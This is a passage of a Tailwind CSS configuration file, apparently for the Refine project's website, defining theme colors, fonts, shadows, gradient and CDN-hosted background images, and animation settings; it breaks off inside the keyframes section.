const defaultTheme = require("tailwindcss/defaultTheme");
const plugin = require("tailwindcss/plugin");

/** @type {import('tailwindcss').Config} */
module.exports = {
  darkMode: ["class", '[data-theme="dark"]'],
  content: [
    "./src/**/*.{js,jsx,ts,tsx}",
    "./docs/**/*.{md,mdx,tsx}",
    "./tutorial/**/*.{md,mdx,tsx}",
  ],
  jit: true,
  theme: {
    extend: {
      borderRadius: {
        "2.5xl": "1.25rem",
      },
      zIndex: {
        popover: 9,
        modal: 100,
        mobileNavbar: 1000,
        "top-announcement": 1000,
      },
      colors: {
        discord: "#5865F2",
        twitter: "#00AAEC",
        refine: {
          red: "#FF4C4D",
          orange: "#FF9933",
          yellow: "#FFBF00",
          green: "#1FAD66",
          "green-alt": "#26D97F",
          "tutorial-green": "#24A866",
          cyan: "#0F8A8A",
          "cyan-alt": "#47EBEB",
          blue: "#0080FF",
          selection: "#6EF7F7",
          "enterprise-purple": "#4D0099",
          "enterprise-purple-2": "#8000ff",
          "enterprise-purple-3": "#E6CCFF",
          "enterprise-purple-4": "#3C216A",
          "enterprise-purple-5": "#BF80FF",
          "blue-alt": "#6EB3F7",
          "blue-2": "#58AFDF",
          "blue-2-light": "#E6F7FF",
          "react-dark-link": "#38BDF8",
          "react-light-link": "#0369A1",
          "react-dark-code": "#09090B",
          "react-light-code": "#FAFAFA",
          indigo: "#3333FF",
          "indigo-alt": "#8080FF",
          purple: "#8000FF",
          "purple-alt": "#B366FF",
          pink: "#ED5EC9",
          bg: "#0A0A29",
          kdb: "#DBDBF0",
          "react-dark-orange": "#FB923C", // orange-400
          "react-dark-purple": "#C084FC", // purple-400
          "react-dark-green": "#4ADE80", // green-400
          "react-dark-green-alt": "#26D97F",
          "react-light-orange": "#C2410C", // orange-700
          "react-light-purple": "#8200db", // purple-700
          "react-light-green": "#15803D", // green-700
          "react-light-green-alt": "#24A866",
          "react-light-orange-bg": "#FEF5E7",
          "react-light-purple-bg": "#F3F4FD",
          "react-light-green-bg": "#F4FBF9",
          "tutorial-dark-bg": "#1D2026",
          "bg-alt": "#262640",
          "link-dark": "#38BDF8",
          "link-light": "#0369A1",
          "landing-tile-icon-border": "#4D4DB2",
          "landing-playground-border": "#4D4DB2",
          "landing-tile-image-border": "#272762",
          "landing-stats-fallback-bg": "#242442",
          "landing-footer-bg": "#0F0F3D",
          "landing-footer-border": "#2E2E78",
          "walkthrough-button-bg": "#4D4DB2",
          "walkthrough-button-alt-bg": "#474E6B",
          "enterprise-table-alt-dark": "#1D1E30",
          "enterprise-table-alt": "#F4F8FB",
        },
        gray: {
          0: "rgb(var(--color-gray-0) / <alpha-value>)",
          50: "rgb(var(--color-gray-50) / <alpha-value>)",
          100: "rgb(var(--color-gray-100) / <alpha-value>)",
          200: "rgb(var(--color-gray-200) / <alpha-value>)",
          300: "rgb(var(--color-gray-300) / <alpha-value>)",
          400: "rgb(var(--color-gray-400) / <alpha-value>)",
          500: "rgb(var(--color-gray-500) / <alpha-value>)",
          600: "rgb(var(--color-gray-600) / <alpha-value>)",
          700: "rgb(var(--color-gray-700) / <alpha-value>)",
          800: "rgb(var(--color-gray-800) / <alpha-value>)",
          900: "rgb(var(--color-gray-900) / <alpha-value>)",
          1000: "rgb(var(--color-gray-1000) / <alpha-value>)",
        },
        "refine-week": {
          supabase: {
            "cover-shadow": "rgba(62, 207, 142, 0.25)",
            "day-indicator-start": "#1FAD66",
            "day-indicator-stop": "#3ECF8E",
          },
          strapi: {
            "cover-shadow": "rgba(73, 69, 255, 0.25)",
            "day-indicator-start": "#4945FF",
            "day-indicator-stop": "#4D88FF",
          },
        },
      },
      fontFamily: {
        sans: ["var(--primary-font-sans)", ...defaultTheme.fontFamily.sans],
        mono: ["Source Code Pro", ...defaultTheme.fontFamily.mono],
        montserrat: ["Montserrat", ...defaultTheme.fontFamily.serif],
        disket: ["Disket Mono", ...defaultTheme.fontFamily.mono],
        inter: ["Inter", ...defaultTheme.fontFamily.serif],
        "jetBrains-mono": [
          "JetBrains Mono",
          "SFMono-Regular",
          "Menlo",
          "Monaco",
          "Consolas",
          '"Liberation Mono"',
          '"Courier New"',
          "monospace",
        ],
      },
      dropShadow: {
        "showcase-highlight": [
          "0px 3px 7px rgba(108, 119, 147, 0.141)",

          "0px 13px 13px rgba(108, 119, 147, 0.141)",

          "0px 20px 18px rgba(108, 119, 147, 0.18)",

          "0px 34px 21px rgba(108, 119, 147, 0.2)",
          "0px 54px 23px rgba(108, 119, 147, 0)",
        ],
      },
      boxShadow: {
        modal: "4px 8px 16px rgba(42, 42, 66, 0.25)",
        tile: "6px 8px 16px 0 rgba(42, 42, 66, 0.4)",
        integrationTile: "3px 4px 8px 0 rgba(42, 42, 66, 0.25)",
        tagTile: "3px -2px 8px 0 rgba(42, 42, 66, 0.25)",
        startTiles: "4px 8px 16px rgba(42, 42, 66, 0.25)",
        menuItem: "2px 4px 8px rgba(36, 36, 54, 0.2)",
        "enterprise-modal":
          "0px 0.8px 2px rgba(0, 0, 0, 0.064), 0px 2.7px 6.7px rgba(0, 0, 0, 0.096), 0px 12px 30px rgba(0, 0, 0, 0.16)",
        "menu-dark": "0px 0px 0px 4px rgba(48, 52, 80, 0.25)",
        "menu-light": "0px 0px 0px 4px rgba(222, 229, 237, 0.25)",
        "menu-blog-dark": "0px 0px 0px 4px #4449551A",
        "menu-blog-light": "0px 0px 0px 4px #99A1B31A",
        "landing-sweet-spot-code-dark":
          "0px 2.26915px 2.21381px 0px rgba(0, 0, 0, 0.07), 0px 5.45308px 5.32008px 0px rgba(0, 0, 0, 0.11), 0px 10.26767px 10.01724px 0px rgba(0, 0, 0, 0.13), 0px 18.31577px 17.86905px 0px rgba(0, 0, 0, 0.15), 0px 34.25764px 33.42209px 0px rgba(0, 0, 0, 0.19), 0px 82px 80px 0px rgba(0, 0, 0, 0.26)",
      },
      backgroundColor: {
        "landing-header-bg": "rgba(10, 10, 41, 0.70)",
        "landing-header-border": "rgba(48, 52, 80, 0.70)",
        "common-header-bg-dark": "rgba(29, 30, 48, 0.70)",
        "common-header-bg-light": "rgba(244, 248, 251, 0.85)",
      },
      backdropBlur: {
        "header-blur": "12px",
      },

      backgroundImage: {
        "pricing-card-pro-dark":
          "radial-gradient(100% 124.29% at 100% 0%, rgba(8, 126, 164, 0.5) 0%, rgba(35, 39, 47, 0) 50%) ,radial-gradient(100% 124.29% at 0% 100%, rgba(8, 126, 164, 0.25) 0%, rgba(35, 39, 47, 0) 50%)",
        "pricing-card-pro-light":
          "radial-gradient(146.45% 100% at 100% 100%, rgba(255, 255, 255, 0) 0%, rgba(88, 196, 220, 0.125) 50%, rgba(255, 255, 255, 0) 100%)",
        "landing-noise": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
        ],
        noise:
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
        "walkthrough-button-shadow":
          "conic-gradient(from 231deg at 50% 50%, #A3A3F5 0%, #4D4DB2 6%, #4D4DB2 44%, #A3A3F5 50%, #4D4DB2 56%, #4D4DB2 94%, #A3A3F5 100%)",
        "walkthrough-button-alt-shadow":
          "conic-gradient(from 231deg at 50% 50%, #A3A3F5 0%, #474E6B 6%, #474E6B 44%, #A3A3F5 50%, #474E6B 56%, #474E6B 94%, #A3A3F5 100%)",
        "selected-tab-light":
          "linear-gradient(180deg, rgba(110, 179, 247, 0) 50%, rgba(0, 128, 255, 0.25) 100%)",
        "selected-tab-dark":
          "linear-gradient(180deg, rgba(110, 179, 247, 0) 50%, rgba(0, 128, 255, 0.25) 100%)",
        "landing-stars": [
          "linear-gradient(180deg, rgba(10,10,41,0.6) 0%, rgba(10, 10, 41, 0.4) 100%)",
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-stars.webp)",
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
        ],
        "landing-component-divider-dark":
          "linear-gradient(90deg, rgba(48, 52, 80, 0) 0%, #303450 12.5%, #303450 87.5%, rgba(48, 52, 80, 0) 100%)",
        "landing-component-divider":
          "linear-gradient(270deg, rgba(31, 173, 102, 0) 0%, rgba(31, 173, 102, 0.5) 12.5%, rgba(31, 173, 102, 0.5) 87.5%, rgba(31, 173, 102, 0) 100%)",
        "landing-component-badge": [
          "linear-gradient(306deg, #303450 0%, rgba(20, 20, 31, 0.5) 100%)",
          "linear-gradient(168deg, rgba(38, 217, 127, 0.9) 15%, rgba(71, 235, 235, 0) 50%)",
          "linear-gradient(0deg, #303450, #303450)",
        ],
        "landing-component-badge-glow":
          "radial-gradient(50% 50% at 50% 50%, rgba(38, 217, 127, 0.1) 0%, rgba(71, 235, 235, 0) 100%)",
        "landing-text-bg":
          "linear-gradient(180deg, #FFFFFF 0%, rgba(255, 255, 255, 0.6) 100%)",
        "landing-text-bg-alt":
          "linear-gradient(180deg, #FFFFFF 0%, rgba(255, 255, 255, 0.4) 80%, rgba(255,255,255,0.4) 100%)",
        "landing-rainbow":
          "conic-gradient(from 180deg at 50% 50%, #3FDCF7 0deg, #1890FF 51.43deg, #6813CB 102.86deg, #FF003D 154.29deg, #FF8A00 205.71deg, #FFD600 257.14deg, #67BE23 308.57deg, #3FDCF7 360deg)",
        "landing-ghost":
          "conic-gradient(from 90deg at 50% 50%, rgba(255, 255, 255, 0.25) 0%, rgba(255, 255, 255, 0.25) 10%, rgba(255, 255, 255, 1) 20%, rgba(255, 255, 255, 0.25) 30%, rgba(255, 255, 255, 0.25) 60%, rgba(255, 255, 255, 1) 70%, rgba(255, 255, 255, 0.25) 80%, rgba(255, 255, 255, 0.25) 100%)",
        "landing-hero-video-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/hero-video-bg.webp')",
        "landing-hero-bottom-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/hero-bottom-bg.svg')",
        "landing-hero-mobile-animation-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/hero-mobile-animation.svg')",
        "landing-video-bottom-mobile-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/hero-video-bottom-mobile.svg')",
        "landing-video-bottom-line":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-video-bottom-line.svg')",
        "landing-video-bottom-line-glow":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-video-bottom-line-glow.svg')",
        "landing-linear-spectrum":
          "linear-gradient(90deg, #FFFE00 0%, #FF9933 12.5%, #FF4C4D 25%, #ED5EC9 37.5%, #8000FF 50%, #3333FF 62.5%, #0080FF 75%, #47EBEB 87.5%, #26D97F 100%)",
        "landing-planar-grid":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-planar-grid.svg')",
        "landing-planar-grid-reversed":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-planar-grid-reversed.svg')",
        "landing-planar-grid-mobile":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-planar-grid-mobile.svg')",
        "landing-planar-grid-reversed-mobile":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-planar-grid-reversed-mobile.svg')",
        "landing-tile-image-bg":
          "radial-gradient(50.33% 83.06% at -0.33% 100%, rgba(77, 77, 179, 0.5) 0%, rgba(77, 77, 179, 0) 100%)",
        "landing-tile-tile-bg":
          "radial-gradient(232% 232% at 100% 100%, rgba(77, 77, 179, 0) 0%, rgba(77, 77, 179, 0.05) 33.33%, rgba(77, 77, 179, 0.1) 66.67%, rgba(77, 77, 179, 0.2) 100%)",
        "landing-tile-border-bg":
          "radial-gradient(100% 100% at 0% 0%, #4D4DB3 0%, rgba(77, 77, 179, 0.05) 50%, rgba(77, 77, 179, 0.5) 100%)",
        "landing-tile-grid-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-tile-grid.svg')",
        "landing-tile-grid-mobile-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-tile-grid-mobile.svg')",
        "landing-stats-bg": [
          "radial-gradient(59.21% 56.25% at 0% 0%, #17174F 0%, rgba(23, 23, 79, 0) 100%)",
          "linear-gradient(180deg, rgba(0, 0, 0, 0.33) 0%, rgba(0, 0, 0, 0.165) 100%)",
        ],
        "landing-stats-border-bg":
          "conic-gradient(from -90deg at 50% 50%, rgba(77, 77, 179, 0) 0deg, #4D4DB3 39.37deg, rgba(77, 77, 179, 0) 86.25deg, rgba(77, 77, 179, 0) 198.75deg, #4D4DB3 232.5deg, rgba(77, 77, 179, 0) 275.62deg, rgba(77, 77, 179, 0) 360deg)",
        "landing-stats-text-dark":
          "linear-gradient(180deg, #FFF 25%, rgba(255, 255, 255, 0.25) 100%)",
        "landing-stats-text":
          "linear-gradient(180deg, #14141F 25%, rgba(20, 20, 31, 0.50) 100%)",
        "landing-playground-bg": [
          "linear-gradient(90deg, rgba(23, 23, 79, 0) 0%, #17174F 100%)",
          "linear-gradient(180deg, rgba(0, 0, 0, 0.165) 0%, rgba(0, 0, 0, 0.33) 50%, rgba(0, 0, 0, 0.165) 100%)",
        ],
        "landing-playground-slide-left-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-playground-slide-left.svg')",
        "landing-playground-slide-right-bg":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-playground-slide-right.svg')",
        "ai-landing-hero-dark-md": [
          "radial-gradient(50% 50% at 50% 50%, rgba(38, 217, 126, 0.2) 20%, rgba(38, 217, 126, 0) 100%)",
        ],
        "ai-landing-hero-md": [
          "radial-gradient(50% 50% at 50% 50%, rgba(51, 51, 255, 0.2) 20%, rgba(51, 51, 255, 0) 100%)",
        ],
        "ai-landing-hero-dark": [
          "radial-gradient(100% 249.65% at 0% 47.87%, rgba(38, 217, 126, 0.25) 0%, rgba(38, 217, 126, 0) 100%)",
        ],
        "ai-landing-hero": [
          "radial-gradient(100% 249.65% at 0% 47.87%, rgba(51, 51, 255, 0.25) 0%, rgba(51, 51, 255, 0) 100%)",
        ],
        "ai-landing-packages-dark": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(50% 100% at 100% 0%, rgba(38, 217, 127, 0.25) 0%, rgba(38, 217, 127, 0) 100%)",
        ],
        "ai-landing-packages": [
          "radial-gradient(50% 100% at 100% 0%, rgba(51, 51, 255, 0.25) 0%, rgba(51, 51, 255, 0) 100%)",
        ],
        "ai-landing-packages-mobile-dark": [
          "radial-gradient(50% 47.81% at 100% 0%, rgba(38, 217, 127, 0.25) 0%, rgba(38, 217, 127, 0) 100%)",
          "radial-gradient(50% 47.81% at 0% 0%, rgba(38, 217, 127, 0.25) 0%, rgba(38, 217, 127, 0) 100%)",
        ],
        "ai-landing-packages-mobile": [
          "radial-gradient(50% 100% at 100% 0%, rgba(51, 51, 255, 0.25) 0%, rgba(51, 51, 255, 0) 100%)",
          "radial-gradient(50% 100% at 0% 0%, rgba(51, 51, 255, 0.25) 0%, rgba(51, 51, 255, 0) 100%)",
        ],
        "landing-sweet-spot-glow-red-dark":
          "radial-gradient(80% 80% at 100% 0%, rgba(239, 68, 68, 0.25) 0%, rgba(239, 68, 68, 0.15) 25%, rgba(239, 68, 68, 0.08) 40%, rgba(239, 68, 68, 0.04) 60%, rgba(239, 68, 68, 0.01) 80%, rgba(239, 68, 68, 0.00) 100%)",
        "landing-sweet-spot-glow-yellow-dark":
          "radial-gradient(80% 80% at 100% 0%, rgba(234, 179, 8, 0.25) 0%, rgba(234, 179, 8, 0.15) 25%, rgba(234, 179, 8, 0.08) 40%, rgba(234, 179, 8, 0.04) 60%, rgba(234, 179, 8, 0.01) 80%, rgba(234, 179, 8, 0.00) 100%)",
        "landing-sweet-spot-glow-orange-dark":
          "radial-gradient(80% 80% at 100% 0%, rgba(249, 115, 22, 0.25) 0%, rgba(249, 115, 22, 0.15) 25%, rgba(249, 115, 22, 0.08) 40%, rgba(249, 115, 22, 0.04) 60%, rgba(249, 115, 22, 0.01) 80%, rgba(249, 115, 22, 0.00) 100%)",
        "landing-sweet-spot-glow-cyan-dark":
          "radial-gradient(80% 80% at 100% 0%, rgba(6, 182, 212, 0.25) 0%, rgba(6, 182, 212, 0.15) 25%, rgba(6, 182, 212, 0.08) 40%, rgba(6, 182, 212, 0.04) 60%, rgba(6, 182, 212, 0.01) 80%, rgba(6, 182, 212, 0.00) 100%)",
        "landing-sweet-spot-glow-blue-dark":
          "radial-gradient(80% 80% at 100% 0%, rgba(59, 130, 246, 0.25) 0%, rgba(59, 130, 246, 0.15) 25%, rgba(59, 130, 246, 0.08) 40%, rgba(59, 130, 246, 0.04) 60%, rgba(59, 130, 246, 0.01) 80%, rgba(59, 130, 246, 0.00) 100%)",
        "landing-sweet-spot-glow-indigo-dark":
          "radial-gradient(80% 80% at 100% 0%, rgba(139, 92, 246, 0.25) 0%, rgba(139, 92, 246, 0.15) 25%, rgba(139, 92, 246, 0.08) 40%, rgba(139, 92, 246, 0.04) 60%, rgba(139, 92, 246, 0.01) 80%, rgba(139, 92, 246, 0.00) 100%)",
        "hackathon-button-bg":
          "linear-gradient(90deg, rgba(255, 76, 166, 0.3) 0%, rgba(128, 0, 255, 0.3) 50%, rgba(0, 128, 255, 0.3) 100%);",
        "refine-week-supabase-timeline-item-bg":
          "linear-gradient(360deg, rgba(62, 207, 142, 0) 0%, rgba(62, 207, 142, 0.25) 50%, rgba(62, 207, 142, 0) 100%)",
        "refine-week-supabase-timeline-item-bg-lg":
          "linear-gradient(256deg, rgba(62, 207, 142, 0.25) 0%, rgba(62, 207, 142, 0) 60%)",
        "refine-week-strapi-timeline-item-bg":
          "linear-gradient(360deg, rgba(73, 69, 255, 0) 0%, rgba(73, 69, 255, 0.25) 50%, rgba(73, 69, 255, 0) 100%)",
        "refine-week-strapi-timeline-item-bg-lg":
          "linear-gradient(256deg, rgba(73, 69, 255, 0.25) 0%, rgba(73, 69, 255, 0) 60%)",
        "week-of-refine-strapi-card":
          "linear-gradient(207deg, rgba(73, 69, 255, 0.25) 0%, rgba(73, 69, 255, 0.00) 100%)",
        "week-of-refine-supabase-card":
          "linear-gradient(207deg, rgba(62, 207, 142, 0.25) 0%, rgba(62, 207, 142, 0.00) 100%)",
        "week-of-refine-strapi-card-light":
          "linear-gradient(207deg, rgba(73, 69, 255, 0.15) 0%, rgba(73, 69, 255, 0.00) 100%)",
        "week-of-refine-supabase-card-light":
          "linear-gradient(207deg, rgba(62, 207, 142, 0.15) 0%, rgba(62, 207, 142, 0.00) 100%)",
        "banner-examples-gray": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(70.09% 100% at 50% 0%, #474E6B 0%, #303450 100%)",
        ],
        "banner-examples-purple": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(294.84% 141.42% at 100% 100%, #33F 0%, #8000FF 50%, #303450 100%)",
        ],
        "banner-examples-modal-gray": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(75.69% 100% at 50% 0%, #474E6B 0%, #303450 100%)",
        ],
        "banner-examples-modal-purple": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(152.26% 141.42% at 100% 100%, #33F 0%, #8000FF 50%, #303450 100%)",
        ],
        "banner-examples-sider-gray": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(75.69% 100% at 50% 0%, #474E6B 0%, #303450 100%)",
        ],
        "banner-examples-sider-purple": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(191.28% 141.42% at 100% 100%, #33F 0%, #8000FF 50%, #303450 100%)",
        ],
        "banner-examples-text":
          "linear-gradient(180deg, #FFF 0%, rgba(255, 255, 255, 0.50) 100%)",
        "top-announcement-text":
          "linear-gradient(90deg, rgba(31, 63, 72, 0.00) 0%, #1F3F48 10%, #1F3F48 90%, rgba(31, 63, 72, 0.00) 100%)",
        "sidebar-item-shiny-dark":
          "radial-gradient(457.67% 141.42% at 0% 0%, rgba(71, 235, 235, 0.10) 0%, rgba(71, 235, 235, 0.20) 100%)",
        "sidebar-item-shiny-light":
          "radial-gradient(457.67% 141.42% at 0% 0%, rgba(0, 128, 255, 0.20) 0%, rgba(0, 128, 255, 0.10) 100%)",
        "top-announcement-bg-tr":
          "url('https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/top-announcement-tr.png')",
        "landing-hero-item-name-gradient":
          "linear-gradient(180deg, #FFFFFF 0%, rgba(255, 255, 255, 0.5) 100%)",
        "landing-hero-item-background":
          "radial-gradient(104% 104% at 0% 0%, rgba(249, 210, 54, 0.10) 0%, rgba(249, 210, 54, 0.00) 100%)",
        "landing-hero-beam-bottom":
          "linear-gradient(90deg, rgba(255,255,255,0), #47EBEB, rgba(255,255,255,0))",
        "landing-hero-xray-dot-center-bg":
          "radial-gradient(100% 100% at 0% 0%, #74FFFF 0%, #0FBDBD 50%, #0FBDBD 100%)",
        "landing-hero-xray-dot-center-bg-light":
          "radial-gradient(100% 100% at 0% 0%, #74FFFF 0%, #0080FF 50%, #0080FF 100%)",
        "landing-hero-beam-bg":
          "conic-gradient(from 280deg, currentColor 6%, transparent 14%, transparent 100%)",
        "footer-landing-dark-bg": [
          "linear-gradient(180deg, rgba(29, 30, 48, 0.5) 0%, #14141F 100%)",
        ],
        "footer-blog-dark-bg": [
          "linear-gradient(180deg, rgba(52, 58, 70, 0) 0%, rgba(52, 58, 70, 0.5) 100%)",
        ],
        "landing-copy-command-hover-bg-dark": [
          "radial-gradient(transparent 30%, rgba(249, 115, 22, 0.10))",
        ],
        "enterprise-copy-command-hover-bg-dark": [
          "radial-gradient(transparent 30%, rgba(128, 0, 255, 0.30))",
        ],
        "enterprise-copy-command-hover-bg-light": [
          "radial-gradient(transparent 30%, rgba(128, 0, 255, 0.1))",
        ],
        "enterprise-cta-dark": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(45% 80% at 50% 50%, rgba(71, 235, 235, 0.15) 0%, rgba(71, 235, 235, 0.00) 100%)",
        ],
        "enterprise-cta-dark-md": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(30% 100% at 100% 50%, rgba(71, 235, 235, 0.15) 0%, rgba(71, 235, 235, 0.00) 100%)",
        ],
        "enterprise-cta-light":
          "radial-gradient(100% 100% at 50% 50%, rgba(0, 128, 255, 0.15) 0%, rgba(0, 128, 255, 0.00) 100%)",
        "enterprise-cta-light-md":
          "radial-gradient(60% 100% at 100% 50%, rgba(0, 128, 255, 0.15) 0%, rgba(0, 128, 255, 0.00) 100%)",
        "enterprise-data-source-dark":
          "radial-gradient(100% 90% at 120% -12%, rgba(255, 255, 255, 0.50) 45%, rgba(255, 255, 255, 0.00) 100%)",
        "enterprise-frequent-updates-dark": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(70% 90% at 50% 100%, rgba(38, 217, 127, 0.10) 0%, rgba(38, 217, 127, 0.00) 100%)",
        ],
        "enterprise-frequent-updates-light":
          "radial-gradient(100% 100% at 50% 100%, rgba(0, 128, 255, 0.25) 0%, rgba(0, 128, 255, 0.00) 100%)",
        "enterprise-frequent-updates-dark-md": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/landing-noise.webp)",
          "radial-gradient(50% 100% at 100% 50%, rgba(38, 217, 127, 0.15) 0%, rgba(38, 217, 127, 0.00) 100%)",
        ],
        "enterprise-frequent-updates-light-md":
          "radial-gradient(120% 100% at 100% 50%, rgba(0, 128, 255, 0.25) 0%, rgba(0, 128, 255, 0.00) 100%)",
        "new-badge-border-dark":
          "conic-gradient(from 45deg at 50% 50%, #194b3a, rgb(38 217 127 / 40%), #194b3a, #194b3a, #194b3a, #26d97f, #194b3a, #194b3a, #194b3a)",
        "new-badge-border-light": `conic-gradient(
                    from 45deg at 50% 50%,
                    #b7dbff,
                    rgb(0 128 255 / 50%),
                    #b7dbff,
                    #b7dbff,
                    #b7dbff,
                    #0080ff,
                    #b7dbff,
                    #b7dbff,
                    #b7dbff
                )`,
        "purple-new-badge-border-dark": `conic-gradient(
                    from 45deg at 50% 50%,
                    #4D0099,
                    #E6CCFF,
                    #4D0099,
                    #4D0099,
                    #4D0099,
                    #E6CCFF,
                    #4D0099,
                    #4D0099,
                    #4D0099
                )`,
        "purple-new-badge-border-light": `conic-gradient(
                    from 45deg at 50% 50%,
                    #E6CCFF,
                    #4D0099,
                    #E6CCFF,
                    #E6CCFF,
                    #E6CCFF,
                    #4D0099,
                    #E6CCFF,
                    #E6CCFF,
                    #E6CCFF
                )`,
        "enterprise-cta-button-bg-light":
          "radial-gradient(100% 375% at 100% 50%, #8000FF 0%, #3333FF 100%)",
        "enterprise-cta-button-bg-dark":
          "radial-gradient(100% 375% at 100% 50%, #26D97F 0%, #47EBEB 100%)",
        "landing-wai-sunshine-dark":
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/wheel-already-invented-sunshine-normal.webp)",
        "landing-wai-grid-dark":
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/wheel-already-invented-grid-unit-normal.png)",

        "refine-ai-page-bg-dark": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/refine-ai-page-bg-dark.png)",
          "radial-gradient(46.3% 35.37% at 50% 35.37%, rgba(38, 217, 126, 0.25) 0%, rgba(38, 217, 126, 0) 100%)",
        ],
        "refine-ai-page-bg-light": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/website/static/assets/refine-ai-page-bg-light.png)",
          "radial-gradient(46.3% 35.37% at 50% 35.37%, rgba(51, 51, 255, 0.15) 0%, rgba(51, 51, 255, 0)100%)",
          "radial-gradient(46.3% 35.37% at 50% 35.37%, rgba(0, 0, 0, 0.10) 0%, rgba(0, 0, 0, 0) 100%)",
        ],
        "blog-hero-bg": [
          "url(https://refine.ams3.cdn.digitaloceanspaces.com/refine-ai/landing/landing-hero-bg-texture.png)",
          "radial-gradient(50% 100% at 50% 0%, #431407 0%, rgba(67, 20, 7, 0) 100%)",
        ],
      },
      backgroundPosition: {
        "wheel-already-invented-position": "center",
      },
      backgroundSize: {
        "landing-wizard-option": "600px 600px, auto",
        "landing-wizard-side-size": "512px 512px",
        "wheel-already-invented-size": "100% 1px",
      },
      animation: {
        "spin-slow": "spin 3s linear infinite",
        beat: "2s ease-in-out 1.5s infinite normal forwards running landing-hero-beat",
        "playground-slide-down": "playground-slide-down 45s linear infinite",
        "playground-slide-down-mobile":
          "playground-slide-down-mobile 45s linear infinite",
        "playground-slide-up": "playground-slide-up 45s linear infinite",
        "playground-slide-up-mobile":
          "playground-slide-up-mobile 45s linear infinite",
        "hackathon-button-bg":
          "hackathon-button-bg 2s ease-in-out infinite alternate",
        "walkthrough-bounce": "walkthrough-bounce 3s ease-in-out infinite",
        "top-announcement-glow":
          "top-announcement-glow 1s ease-in-out infinite alternate",
        "landing-hero-grid-beats":
          "landing-hero-grid-beats 2s ease-in-out infinite",
        "hero-logo-pulse": "hero-logo-pulse 4s ease-in-out infinite",
        "mini-bounce": "mini-bounce 3s ease-in-out infinite",
        "dot-waves": "dot-waves 2.5s linear infinite",
        "landing-packages-left": "landing-packages-left 65s linear infinite",
        "landing-packages-right": "landing-packages-right 65s linear infinite",
        "code-scroll": "code-scroll 25s linear infinite",
        "beam-spin": "beam-spin 3s linear 1 forwards",
        "landing-hero-beam-line":
          "landing-hero-beam-line 7.5s ease-in-out infinite",
        "landing-hero-beam-glow":
          "landing-hero-beam-glow 7.5s ease-in-out infinite",
        "landing-hero-beam-bottom":
          "landing-hero-beam-bottom 7.5s ease-in-out infinite",
        "showcase-bottom-fade-reveal":
          "showcase-bottom-fade-reveal 0.3s ease-in-out forwards",
        "opacity-reveal": "opacity-reveal 1s ease-in-out forwards",
        "wheel-already-invented-reveal":
          "wheel-already-invented-reveal 0.6s cubic-bezier(.23,.95,.64,1.24) forwards",
        "showcase-reveal": "showcase-reveal 0.3s ease-in-out forwards",
        "enterprise-iam-services-left":
          "enterprise-iam-services-left 40s linear infinite",
        "enterprise-iam-services-right":
          "enterprise-iam-services-right 40s linear infinite",
        "enterprise-data-source-left":
          "enterprise-data-source-left 25s linear infinite",
        "enterprise-data-source-right":
          "enterprise-data-source-right 25s linear infinite",
        "enterprise-table-left-to-right":
          "enterprise-table-left-to-right 0.3s ease-in-out forwards",
        "enterprise-table-right-to-left":
          "enterprise-table-right-to-left 0.3s ease-in-out forwards",
        "new-badge-border": "new-badge-border 4s linear infinite",
        reveal: "reveal 0.3s ease-in-out forwards",
        "progress-fill": "progressFill 1s linear 1 forwards",
        "refine-ai-video-play-button":
          "refine-ai-video-play-button 1.8s ease-out infinite",
        "ai-landing-packages-right":
          "ai-landing-packages-right 80s linear infinite",
      },
      keyframes: {
        "refine-ai-video-play-button": {
          from: {
            transform: "scale3d(1, 1, 1)",
          },
          "50%": {
            transform: "scale3d(1.22, 1.22, 1.22)",
          },
          to: {
            transform: "scale3d(1, 1, 1)",
          },
        },
        progressFill: {
          "0%": {
            width: "0%",
          },
          "100%": {
            width: "100%",
          },
        },
        reveal: {
          "0%": {
            opacity: 0,
          },
